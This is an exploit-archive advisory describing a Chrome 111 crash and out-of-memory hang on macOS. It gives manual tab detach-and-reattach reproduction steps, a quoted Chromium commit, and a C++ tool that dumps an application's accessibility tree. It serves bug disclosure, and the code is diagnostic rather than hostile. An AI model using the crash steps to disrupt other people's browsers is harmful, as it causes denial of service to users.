@@ -1,0 +1,327 @@
+id: 38582
+date: 04/12/2023
+title: Google Chrome Browser 111.0.5563.64 AXPlatformNodeCocoa Denial Of Service Exploit
+author: LiquidWorm
+cves: 
+
+Google Chrome Browser 111.0.5563.64 AXPlatformNodeCocoa Fatal OOM/Crash (macOS)
+
+
+Vendor: Google LLC
+Product web page: https://www.google.com
+Affected version: 111.0.5563.64 (Official Build) (x86_64)
+                  110.0.5481.100 (Official Build) (x86_64)
+                  108.0.5359.124 (Official Build) (x86_64)
+                  108.0.5359.98 (Official Build) (x86_64)
+Fixed version: 112.0.5615.49 (Official Build) (x86_64)
+
+Summary: Google Chrome browser is a free web browser used for
+accessing the internet and running web-based applications. The
+Google Chrome browser is based on the open source Chromium web
+browser project. Google released Chrome in 2008 and issues several
+updates a year.
+
+Desc: Fatal OOM/crash of Chrome browser while detaching/attaching
+tabs on macOS.
+
+Commit fix:
+
+"The original cl landed many months ago, but
+chrome/browser/ui/views/frame/browser_non_client_frame_view_mac.mm
+is the only change that didn't revert cleanly."
+
+macOS a11y: Implement accessibilityHitTest for remote app shims (PWAs)
+
+Implements accessibility hit testing for RemoteCocoa so that Hover Text
+and VoiceOver mouse mode can read the accessible objects under the
+user's pointer. Cross-process plumbing was needed because RemoteCocoa
+bridges to native controls in a separate app shim process and must
+report accessibility trees from the browser process via the
+undocumented NSAccessibilityRemoteUIElement mechanism.
+
+This CL does the following:
+
+1. Unblocks remote accessibilityHitTest by calling setRemoteUIApp:YES
+   in the browser process. This enables the browser process to accept
+   redirected accessibilityHitTest calls to the object corresponding to
+   any NSAccessibilityRemoteUIElement returned by the original
+   accessibilityHitTest at the app shim process.
+
+2. (For Browser UI) Overrides NativeWidgetMacNSWindowTitledFrame's
+   accessibilityHitTest to have a custom implementation with
+   NSAccessibilityRemoteUIElement support so that custom window
+   controls can be found. Additionally, adjusts the BrowserView bounds
+   so that AXPlatformNodeCocoa's accessibilityHitTest (which doesn't
+   support view targeting) can return controls in the web app frame
+   toolbar.
+
+3. (For Web Content) Implements RenderWidgetHostViewCocoa's
+   accessibilityHitTest for instances in the app shim to return a
+   NSAccessibilityRemoteUIElement corresponding to their counterparts
+   in the browser process so that web content objects can be found.
+
+
+Tested on: macOS 12.6.1 (Monterey)
+           macOS 13.3.1 (Ventura)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2023-5770
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5770.php
+
+
+08.12.2022
+
+--
+
+
+UI PoC:
+-------
+1. Grab a tab and detach it.
+2. Bring back the tab.
+3. Do this 2-3 times attaching / re-attaching the tab.
+4. Chrome will hang (100% CPU) / Out-of-Memory (OOM) for 7-8 minutes.
+5. Process crashes entirely.
+
+Ref: Issue 1400682 (Ticket created: Dec 13, 2022)
+Ref: https://bugs.chromium.org/p/chromium/issues/detail?id=1400682
+Ref: https://chromium-review.googlesource.com/c/chromium/src/+/3861171
+Ref: axtester.mm terminal PoC by xi.ch...@gmail.com (https://bugs.chromium.org/u/161486905)
+
+=============
+//
+// Copyright (c) Microsoft Corporation. All rights reserved.
+//
+
+#include <ApplicationServices/ApplicationServices.h>
+
+#include <iostream>
+#include <sstream>
+#include <vector>
+
+__BEGIN_DECLS
+    // NOLINTNEXTLINE
+    AXError _AXUIElementGetWindow(AXUIElementRef, CGWindowID *);
+    // NOLINTNEXTLINE
+    CFTypeID AXTextMarkerGetTypeID();
+__END_DECLS
+
+std::ostream& bold_on(std::ostream& os)
+{
+    if (isatty(STDOUT_FILENO))
+    {
+        return os << "\e[1m";
+    }
+    return os;
+}
+
+std::ostream& bold_off(std::ostream& os)
+{
+    if (isatty(STDOUT_FILENO))
+    {
+        return os << "\e[0m";
+    }
+    return os;
+}
+
+std::string from_cfstr(CFTypeRef cf_ref)
+{
+    if (cf_ref != nullptr && CFGetTypeID(cf_ref) == CFStringGetTypeID())
+    {
+        const auto cf_str = static_cast<CFStringRef>(cf_ref);
+        const auto max_length = static_cast<size_t>(CFStringGetMaximumSizeForEncoding(
+            CFStringGetLength(cf_str), kCFStringEncodingUTF8)) + 1;
+
+        auto result = std::string(max_length, '\0');
+        if (CFStringGetCString(cf_str, result.data(), static_cast<CFIndex>(max_length), kCFStringEncodingUTF8))
+        {
+            if (const auto pos = result.find('\0'); pos != std::string::npos)
+            {
+                result.resize(pos);
+            }
+            return result;
+        }
+    }
+    return {};
+}
+
+std::string ax_element_id(AXUIElementRef value)
+{
+    // AX element cache - AX elements are backed by CFData
+    // (referring to 'remote' AX objects) and this data is
+    // 'stable' across 'volatile' instances of AXUIElement.
+    // 'hash and equality' of AX elements are based on this
+    // data and therefore, we can use AXUIElement objects as
+    // 'keys' in a dictionary with values, identifying these
+    // objects (uniquely).
+    const static auto ax_elements = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    auto ax_id = CFDictionaryGetValue(ax_elements, value);
+
+    if (ax_id == nullptr)
+    {
+        if (const auto uuid = CFUUIDCreate(kCFAllocatorDefault))
+        {
+            if (const auto uuid_s = CFUUIDCreateString(kCFAllocatorDefault, uuid))
+            {
+                CFDictionarySetValue(ax_elements, value, uuid_s);
+
+                CFRelease(uuid_s);
+            }
+            CFRelease(uuid);
+        }
+
+        ax_id = CFDictionaryGetValue(ax_elements, value);
+    }
+
+    return from_cfstr(ax_id);
+}
+
+template <typename T>
+T ax_attribute_value(AXUIElementRef e, CFStringRef name)
+{
+    if (e != nullptr)
+    {
+        auto ref = T{};
+        if (AXUIElementCopyAttributeValue(e, name, (CFTypeRef *) &ref) == kAXErrorSuccess)
+        {
+            return ref;
+        }
+    }
+    return nullptr;
+}
+
+// NOLINTNEXTLINE
+void ax_traverse(AXUIElementRef elem, uint32_t depth)
+{
+    const auto max_depth = 10;
+    if (depth > max_depth)
+    {
+        return;
+    }
+
+    const auto indent = [&]()
+    {
+        for (auto x = 0; x < depth; x++)
+        {
+            std::cout << "  ";
+        }
+    };
+
+    auto wid = CGWindowID{};
+    if (_AXUIElementGetWindow(elem, &wid) != kAXErrorSuccess)
+    {
+        wid = 0;
+    }
+
+    indent();
+    const auto role = ax_attribute_value<CFTypeRef>(elem, kAXRoleAttribute);
+
+    std::cout << bold_on << "[*** DEPTH: " << depth << ", ROLE: " << from_cfstr(role) <<
+        ", ID: " << ax_element_id(elem) << ", WINDOW: " << wid << " ***]" << bold_off <<
+        std::endl;
+
+    if (const auto children = ax_attribute_value<CFArrayRef>(elem, kAXChildrenAttribute))
+    {
+        for (CFIndex idx = 0; idx < CFArrayGetCount(children); idx++)
+        {
+            const auto element = static_cast<AXUIElementRef>(CFArrayGetValueAtIndex(children, idx));
+            ax_traverse(element, depth + 1);
+        }
+        CFRelease(children);
+    }
+}
+
+int main(int argc, char* const argv[])
+{
+    auto pid = 0;
+
+    if (argc > 1)
+    {
+        if (!AXIsProcessTrusted())
+        {
+            std::cerr << "Please 'AX approve' Terminal in System Preferences" << std::endl;
+            exit(1); // NOLINT
+        }
+        // NOLINTNEXTLINE
+        pid = std::stoi(argv[1]);
+    }
+    else
+    {
+        std::cerr << "usage: axtester <pid>" << std::endl;
+        exit(1); // NOLINT
+    }
+
+    if (const auto app = AXUIElementCreateApplication(pid))
+    {
+        auto observer = AXObserverRef{};
+        auto ret = AXObserverCreate(pid, [](auto /*unused*/, AXUIElementRef /*unused*/, CFStringRef name, auto ctx)
+            {
+                auto myapp = (__AXUIElement*)(ctx);
+                auto hint = CFStringGetCStringPtr(name,kCFStringEncodingUTF8);
+                std::cout << "Hint: " << hint << std::endl;
+                ax_traverse(myapp, 0);
+            }, &observer);
+
+        if (kAXErrorSuccess != ret)
+        {
+            std::cerr << "Fail to create observer" << std::endl;
+            return -1;
+        }
+
+        std::cout << "title:" << AXObserverAddNotification(observer, app, kAXTitleChangedNotification, (void*)app) << std::endl;
+        std::cout << "focus_window:" << AXObserverAddNotification(observer, app, kAXFocusedWindowChangedNotification, (void*)app) << std::endl;
+        std::cout << "focus_element:" << AXObserverAddNotification(observer, app, kAXFocusedUIElementChangedNotification, (void*)app) << std::endl;
+        std::cout << "move:" << AXObserverAddNotification(observer, app, kAXWindowMovedNotification, (void*)app) << std::endl;
+        std::cout << "resize:" << AXObserverAddNotification(observer, app, kAXWindowResizedNotification, (void*)app) << std::endl;
+        std::cout << "deminiaturized:" << AXObserverAddNotification(observer, app, kAXWindowDeminiaturizedNotification, (void*)app) << std::endl;
+        std::cout << "miniaturize:" << AXObserverAddNotification(observer, app, kAXWindowMiniaturizedNotification, (void*)app) << std::endl;
+        CFRunLoopAddSource(CFRunLoopGetCurrent(), AXObserverGetRunLoopSource(observer), kCFRunLoopDefaultMode);
+        CFRunLoopRun();
+    }
+
+    return 0;
+}
+
+--codeaibot explains--
+
+This is a C++ program that uses the Accessibility API (AX) provided
+by macOS to traverse the user interface of a running application and
+print out information about the accessibility elements that it finds.
+
+The program takes a single argument, which is the process ID (PID) of
+the application to examine. If no argument is provided, the program
+displays a usage message and exits.
+
+The main() function first checks if the Terminal app has been granted
+accessibility privileges by calling the AXIsProcessTrusted() function.
+If it hasn't, the program displays an error message and exits.
+
+If the Terminal app has been granted accessibility privileges, the program
+creates an AXUIElementRef object for the application using the AXUIElementCreateApplication()
+function, passing in the PID as an argument.
+
+The ax_traverse() function is then called with the root accessibility
+element of the application as an argument. This function recursively
+traverses the accessibility tree of the application, printing out
+information about each element it encounters.
+
+The program also defines several helper functions for working with Core
+Foundation types (from_cfstr(), ax_element_id(), and ax_attribute_value()),
+as well as some functions for printing formatted output to the console
+(bold_on() and bold_off()).
+
+-- / --
+
+As this issue is not a security issue nor results in security consequences,
+this report is not eligible for a VRP reward.
+
+++
+Thank you Amy!
+--
+
+#  0day.today [2023-04-19]  #
